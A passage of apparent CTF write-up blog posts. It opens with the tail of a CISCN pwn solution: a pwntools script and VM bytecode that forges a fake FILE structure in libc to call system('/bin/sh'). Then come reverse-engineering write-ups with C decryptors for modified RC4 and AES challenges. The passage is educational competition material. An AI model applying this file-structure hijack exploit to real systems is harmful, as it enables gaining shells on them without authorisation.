class="hljs-keyword">is</span> <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> i.find(<span class="hljs-string">&#x27; &#x27;</span>)==-<span class="hljs-number">1</span>:<br>            op=i.strip()<br>        <span class="hljs-keyword">else</span>:<br>            op,regs=i.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>        opc,opn=getOp(op)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(regs)==<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> opn==<span class="hljs-number">0</span>:<br>            opcode+=p8(opc)<br>        <span class="hljs-keyword">elif</span> regs.find(<span class="hljs-string">&#x27;,&#x27;</span>)!=-<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> opn==<span class="hljs-number">2</span>:<br>            reg1,reg2=regs.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>            opt1,oper1,func1=parse_oper(reg1)<br>            opt2,oper2,func2=parse_oper(reg2)<br>            opt=(opt2&lt;&lt;<span class="hljs-number">2</span>)+opt1<br>            opcode+=p8(opc)+p8(opt)+func1(oper1)+func2(oper2)<br>        <span class="hljs-keyword">else</span>:<br>            opt,oper,func=parse_oper(regs)<br>            opcode+=p8(opc)+p8(opt)+func(oper)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(result)),i)<br>        result+=opcode<br>    <span class="hljs-comment">#print(result)</span><br>    <span class="hljs-keyword">return</span> result<br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;code&#x27;</span>)<br><br>code=f.read()<br>p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;b IO_cleanup\nvmmap&#x27;</span>)<br>pause()<br>p.send(parse(code))<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs c">mov rax,<span class="hljs-number">0x112000</span>+<span class="hljs-number">0x3a040</span>+<span class="hljs-number">32</span><br>nop<br>mov rbx,[rax]<br>nop<br>nop<br>nop<br>nop<br>mov rax,rbx<br>mov rcx,<span class="hljs-number">0x112000</span><span class="hljs-number">-0xb00</span><br>nop<br>mov rbx,[rcx]    <span class="hljs-meta">#libcaddr</span><br>sub rax,<span class="hljs-number">0x112000</span><span class="hljs-number">-0xb00</span>   <span class="hljs-meta">#bufaddr</span><br>nop<br>nop<br>nop<br>add rbx,<span class="hljs-number">2209664</span>  <span class="hljs-meta"># stdout</span><br>nop<br>nop<br>mov rdx,rbx<br>nop<br>nop<br>sub rbx,rax <br>nop<br>nop<br>mov rax,rdx      <span class="hljs-meta"># getoffset</span><br><br>add rdx,<span class="hljs-number">8</span>        <span class="hljs-meta"># mov [fakeio]</span><br>mov rcx,<span class="hljs-number">0</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+8]=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span></span><br>mov rdx,<span class="hljs-number">0x68732f6e69622f</span><br>add rbx,<span class="hljs-number">8</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x10]=<span class="hljs-string">&#x27;0&#x27;</span></span><br>mov rdx,<span class="hljs-number">0</span><br>add rbx,<span class="hljs-number">0x10</span><span class="hljs-number">-8</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x18]=<span class="hljs-string">&#x27;0&#x27;</span></span><br>mov rdx,<span class="hljs-number">0</span><br>add rbx,<span class="hljs-number">0x18</span><span class="hljs-number">-0x10</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x20]=<span class="hljs-string">&#x27;0&#x27;</span></span><br>mov rdx,<span class="hljs-number">0</span><br>add rbx,<span class="hljs-number">0x20</span><span class="hljs-number">-0x18</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x28]=0x7fffffffffffffff</span><br>mov rdx,<span class="hljs-number">0x7fffffffffffffff</span><br>add rbx,<span class="hljs-number">0x28</span><span class="hljs-number">-0x20</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x30]=0</span><br>mov rdx,<span class="hljs-number">0</span><br>add rbx,<span class="hljs-number">0x30</span><span class="hljs-number">-0x28</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x38]=system</span><br>mov rdx,rax<br>nop<br>nop<br>sub rdx,<span class="hljs-number">1878544</span><br>add rbx,<span class="hljs-number">0x38</span><span class="hljs-number">-0x30</span><br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0x50]=<span class="hljs-string">&#x27;0&#x27;</span></span><br>mov rdx,<span class="hljs-number">0</span><br>add rbx,<span class="hljs-number">0x50</span><span class="hljs-number">-0x38</span><br>nop<br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0xd8]=obstack</span><br>mov rdx,rax<br>nop<br>sub rdx,<span class="hljs-number">17344</span>+<span class="hljs-number">0x48</span><br>add rbx,<span class="hljs-number">0xd8</span><span class="hljs-number">-0x50</span><br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>mov rcx,<span class="hljs-number">0</span>        <span class="hljs-meta"># mov [fakeio+0xe0]=fake_io</span><br>mov rdx,rax<br>nop<br>add rbx,<span class="hljs-number">0xe0</span><span class="hljs-number">-0xd8</span><br>nop<br>nop<br>mov rcx,rbx<br>nop<br>mov [rcx],rdx<br><br>nop<br>nop<br>nop<br>nop<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024天一永安杯</title>
    <link href="/page/wp/2024%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B/"/>
    <url>/page/wp/2024%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="reverse">reverse</h2><h3 id="ezre">ezre</h3><p>现在定义<code>key</code>为加密明文的密钥，key1为加密<code>key</code>的密钥<br>程序首先使用<code>key1</code>作为密钥对<code>key</code>进行了标准<code>rc4</code>加密<br>然后使用加密后的<code>key</code>作为密钥对明文进行了魔改<code>rc4</code>加密，仅仅是将对明文加密时的异或改成了减法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __int64 long long int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __int8 char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _BYTE unsigned char</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(__int64 a1, __int64 a2, <span class="hljs-type">unsigned</span> __int64 a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+23h] [rbp-41Dh]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp-41Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+28h] [rbp-418h]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+2Ch] [rbp-414h]</span><br>  <span class="hljs-type">int</span> v8[<span class="hljs-number">258</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-410h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+438h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">memset</span>(v8, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>uLL);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    *(_BYTE *)(i + a1) = i;<br>    v8[i] = *(<span class="hljs-type">unsigned</span> __int8 *)(i % a3 + a2);<br>  &#125;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">255</span>; ++j )<br>  &#123;<br>    v6 = (v8[j] + v6 + *(<span class="hljs-type">unsigned</span> __int8 *)(j + a1)) % <span class="hljs-number">256</span>;<br>    v4 = *(_BYTE *)(j + a1);<br>    *(_BYTE *)(j + a1) = *(_BYTE *)(v6 + a1);<br>    *(_BYTE *)(a1 + v6) = v4;<br>  &#125;<br>&#125;<br><br>__int64  <span class="hljs-title function_">crypt1</span><span class="hljs-params">(__int64 a1, __int64 a2, <span class="hljs-type">unsigned</span> __int64 a3)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+27h] [rbp-11h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( a3 &lt;= i )<br>      <span class="hljs-keyword">break</span>;<br>    v5 = (v5 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + *(<span class="hljs-type">unsigned</span> __int8 *)(v5 + a1)) % <span class="hljs-number">256</span>;<br>    v4 = *(_BYTE *)(v5 + a1);<br>    *(_BYTE *)(v5 + a1) = *(_BYTE *)(v6 + a1);<br>    *(_BYTE *)(a1 + v6) = v4;<br>    *(_BYTE *)(i + a2) ^= *(_BYTE *)((<span class="hljs-type">unsigned</span> __int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br>__int64  <span class="hljs-title function_">crypt2</span><span class="hljs-params">(__int64 a1, __int64 a2, <span class="hljs-type">unsigned</span> __int64 a3)</span><br>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+27h] [rbp-11h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+2Ch] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+30h] [rbp-8h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( a3 &lt;= i )<br>      <span class="hljs-keyword">break</span>;<br>    v5 = (v5 + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + *(<span class="hljs-type">unsigned</span> __int8 *)(v5 + a1)) % <span class="hljs-number">256</span>;<br>    v4 = *(_BYTE *)(v5 + a1);<br>    *(_BYTE *)(v5 + a1) = *(_BYTE *)(v6 + a1);<br>    *(_BYTE *)(a1 + v6) = v4;<br>    *(_BYTE *)(i + a2) += *(_BYTE *)((<span class="hljs-type">unsigned</span> __int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> cipher[<span class="hljs-number">32</span>] = &#123;<br>    <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x0F</span>, <br>    <span class="hljs-number">0x54</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x00</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> *s=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-type">char</span> key1[]=<span class="hljs-string">&quot;keykey&quot;</span>;<br>    <span class="hljs-type">char</span> key2[]=<span class="hljs-string">&quot;ban_debug!&quot;</span>;<br>    init(s,key1,<span class="hljs-built_in">strlen</span>(key1));<br>    crypt1(s,key2,<span class="hljs-built_in">strlen</span>(key2));<br>    init(s,key2,<span class="hljs-built_in">strlen</span>(key2));<br>    crypt2(s,cipher,<span class="hljs-built_in">strlen</span>(cipher));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,cipher);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="re1">re1</h3><p>首先需要对程序进行手动脱壳<br>一种解法是脱壳之后找到输入点，然后进行动态调试，在输入点之后设置断点<br>然后使用几次步过之后会碰到一个函数<code>0x4016ab</code>，第一个参数为<code>Th1s_1s_Re@lly_k3y</code>，这时在内存空间查看第二个参数，继续使用步过，当函数执行结束时内存空间中查看的数据就会变成flag<br>根据第一种解法我们知道了<code>0x4016ab</code>是用来解密<code>flag</code>的,通过逆向得知<code>0x4016ab</code>是魔改过的<code>rc4</code>，仅仅是将表的大小从<code>256</code>改为了<code>128</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> qword_408040[<span class="hljs-number">1024</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __int64 long long int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __int8 char</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _BYTE unsigned char</span><br><span class="hljs-type">size_t</span> __fastcall <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+24h] [rbp-5Ch]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+28h] [rbp-58h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+2Ch] [rbp-54h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+2Ch] [rbp-54h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x7F</span>; ++i )<br>    qword_408040[i] = i;<br>  v3 = <span class="hljs-number">0</span>;<br>  result = <span class="hljs-number">0</span>;<br>  v4 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">0x7F</span>; ++j )<br>  &#123;<br>    v2 = qword_408040[j];<br>    v4 = ((_BYTE)v4 + v2 + a1[v3]) &amp; <span class="hljs-number">0x7F</span>;<br>    qword_408040[j] = qword_408040[v4];<br>    qword_408040[v4] = v2;<br>    ++v3;<br>    result = <span class="hljs-built_in">strlen</span>(a1);<br>    <span class="hljs-keyword">if</span> ( v3 &gt;= result )<br>      v3 = <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">size_t</span>  <span class="hljs-title function_">cipher</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// [rsp+30h] [rbp-50h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+34h] [rbp-4Ch]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+38h] [rbp-48h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+3Ch] [rbp-44h]</span><br>    init(a1);<br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = <span class="hljs-built_in">strlen</span>(a2);<br>    <span class="hljs-keyword">if</span> ( i &gt;= result )<br>      <span class="hljs-keyword">break</span>;<br>    v5 = (v5 + <span class="hljs-number">1</span>) % <span class="hljs-number">128</span>;<br>    v4 = ((<span class="hljs-type">unsigned</span> __int8)qword_408040[v5] + v4) % <span class="hljs-number">128</span>;<br>    v3 = qword_408040[v5];<br>    qword_408040[v5] = qword_408040[v4];<br>    qword_408040[v4] = v3;<br>    a2[i] ^= qword_408040[(qword_408040[v5] + qword_408040[v4]) &amp; <span class="hljs-number">0x7F</span>];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-type">char</span> data[]=&#123;<span class="hljs-number">42</span>,<span class="hljs-number">35</span>, <span class="hljs-number">69</span>, <span class="hljs-number">104</span>, <span class="hljs-number">85</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60</span>, <span class="hljs-number">34</span>, <span class="hljs-number">61</span>, <span class="hljs-number">57</span>, <span class="hljs-number">35</span>, <span class="hljs-number">119</span>, <span class="hljs-number">114</span>, <span class="hljs-number">50</span>, <span class="hljs-number">124</span>, <span class="hljs-number">92</span>, <span class="hljs-number">117</span>, <span class="hljs-number">65</span>, <span class="hljs-number">27</span>, <span class="hljs-number">87</span>, <span class="hljs-number">123</span>, <span class="hljs-number">112</span>, <span class="hljs-number">19</span>, <span class="hljs-number">79</span>, <span class="hljs-number">5</span>, <span class="hljs-number">51</span>, <span class="hljs-number">28</span>,<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    cipher(<span class="hljs-string">&quot;Th1s_1s_Re@lly_k3y&quot;</span>,data);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,data);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="re2">re2</h3><p>程序虽然控制流比较多，但勉强还能看懂，程序对输入的数据进行了<code>魔改aes</code>加密<br>魔改了<code>aes</code>的<code>s_box</code>,所以解密只需要根据<code>s_box</code>推出<code>d_box</code>就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 